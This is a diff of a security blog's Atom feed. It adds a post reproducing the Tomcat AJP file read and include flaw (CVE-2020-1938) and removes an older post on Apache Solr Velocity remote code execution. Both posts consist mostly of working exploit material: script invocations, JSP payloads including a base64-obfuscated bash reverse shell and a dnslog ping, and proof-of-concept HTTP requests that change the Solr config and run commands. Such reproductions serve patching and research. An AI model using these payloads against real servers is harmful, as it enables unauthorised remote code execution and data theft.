@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2020-02-19T02:25:00.247Z</updated>
+    <updated>2020-02-21T09:28:10.983Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,90 @@
     <logo>http://www.svenbeast.com/images/avatar.png</logo>
     <icon>http://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2020, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）]]></title>
+        <id>http://www.svenbeast.com/post/fqSI9laE8/</id>
+        <link href="http://www.svenbeast.com/post/fqSI9laE8/">
+        </link>
+        <updated>2020-02-21T07:23:52.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-漏洞影响">0x01 漏洞影响</h3>
+<ul>
+<li>Apache Tomcat 9.x &lt; 9.0.31</li>
+<li>Apache Tomcat 8.x &lt; 8.5.51</li>
+<li>Apache Tomcat 7.x &lt; 7.0.100</li>
+<li>Apache Tomcat 6.x</li>
+</ul>
+<h3 id="0x02-前提">0x02 前提</h3>
+<ul>
+<li>
+<ol>
+<li>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</li>
+</ol>
+</li>
+</ul>
+<h3 id="0x03-文件读取文件包含">0x03 文件读取&amp;文件包含</h3>
+<ul>
+<li>
+<ol>
+<li>文件读取</li>
+</ol>
+</li>
+</ul>
+<pre><code>python2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 127.0.0.1
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1582271986826.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<ol start="2">
+<li>文件包含</li>
+</ol>
+</li>
+</ul>
+<pre><code>python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /shell.txt 127.0.0.1
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1582272211312.png" alt="" loading="lazy"></figure>
+<ul>
+<li>test.txt</li>
+</ul>
+<pre><code>&lt;%
+	java.io.InputStream in = Runtime.getRuntime().exec(&quot;ping fiohed.dnslog.cn&quot;).getInputStream();
+	int a = -1;
+	byte[] b = new byte[2048];
+	out.print(&quot;&lt;pre&gt;&quot;);
+	while((a=in.read(b))!=-1){
+		out.println(new String(b));
+	}
+	out.print(&quot;&lt;/pre&gt;&quot;);
+%&gt;
+</code></pre>
+<h3 id="0x04-反弹shell">0x04 反弹shell</h3>
+<ul>
+<li>shell.txt</li>
+</ul>
+<pre><code>&lt;%
+	java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyNC41LzE4ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream();
+	int a = -1;
+	byte[] b = new byte[2048];
+	out.print(&quot;&lt;pre&gt;&quot;);
+	while((a=in.read(b))!=-1){
+		out.println(new String(b));
+	}
+	out.print(&quot;&lt;/pre&gt;&quot;);
+%&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1582276683356.png" alt="" loading="lazy"></figure>
+<ul>
+<li>注意事项：反弹shell用的命令需要进行bash编码</li>
+<li>在线bash编码：http://www.jackson-t.ca/runtime-exec-payloads.html</li>
+<li>POC下载地址：https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read</li>
+</ul>
+<h3 id="0x05-参考链接">0x05 参考链接</h3>
+<ul>
+<li>https://twitter.com/jas502n/status/1230531680999395328</li>
+<li>https://forum.90sec.com/t/topic/801</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[为OneForAll增加一个新增域名监控插件（One_Monitor）]]></title>
         <id>http://www.svenbeast.com/post/-y8PKMNR2/</id>
@@ -386,76 +470,6 @@ Exp：https://xxx.com
 </ul>
 <h1 id="继续深入学习代码审计">继续深入学习代码审计</h1>
 <p>ps:为什么别人的0day像炒土豆丝那么简单，我的就像做满汉全席🏊‍♀</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Apache Solr Velocity远程代码执行漏洞利用]]></title>
-        <id>http://www.svenbeast.com/post/QmuCuXJa9/</id>
-        <link href="http://www.svenbeast.com/post/QmuCuXJa9/">
-        </link>
-        <updated>2019-10-31T07:23:39.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-描述">0x01 描述</h3>
-<pre><code>    攻击者可以在未授权的情况下利用该漏洞，远程发送精心构造的HTTP请求，从而在受影响服务器上进行远程代码执行。
-</code></pre>
-<h3 id="0x02-范围">0x02 范围</h3>
-<pre><code>Apache Solr 5.x至8.x版本
-</code></pre>
-<h3 id="0x03-复现">0x03 复现</h3>
-<ul>
-<li>
-<p>1.获取path<br>
-<img src="http://www.svenbeast.com//post-images/1572507201711.png" alt="" loading="lazy"></p>
-</li>
-<li>
-<p>2.更改设置</p>
-<p>POC</p>
-<pre><code>  使用刚才的path替换路径的test
-
-  POST /solr/test/config HTTP/1.1
-  Host: 192,168.1.1:8983
-  Content-Type: application/json
-  Content-Length: 263
-
-  {
-  &quot;update-queryresponsewriter&quot;: {
-      &quot;startup&quot;: &quot;lazy&quot;,
-      &quot;name&quot;: &quot;velocity&quot;,
-      &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
-      &quot;template.base.dir&quot;: &quot;&quot;,
-      &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
-      &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
-  }
-  }
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1572507369251.png" alt="" loading="lazy"></figure>
-</li>
-<li>
-<p>3.命令执行</p>
-<p>POC</p>
-</li>
-</ul>
-<pre><code>使用刚才的path替换路径的test
-
-GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
-Host: 192.168.1.1:8983
-Content-Type: application/json
-Content-Length: 263
-
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1572507820201.png" alt="" loading="lazy"></figure>
-<h3 id="0x04-反弹shell">0x04 反弹shell</h3>
-<ul>
-<li>1.对bash命令进行runtime编码，在进行url编码，即可成功反弹<br>
-<img src="http://www.svenbeast.com//post-images/1572574188913.png" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1572574231566.png" alt="" loading="lazy"></li>
-<li>2.成功反弹到vbs<br>
-<img src="http://www.svenbeast.com//post-images/1572574310044.png" alt="" loading="lazy"><br>
-<img src="http://www.svenbeast.com//post-images/1572574398917.png" alt="" loading="lazy"></li>
-</ul>
-<h3 id="0x05-修复">0x05 修复</h3>
-<ul>
-<li>官方暂未发布，可关注官网获取补丁或版本更新：http://lucene.apache.org/solr/</li>
-</ul>
 ]]></content>
     </entry>
 </feed>
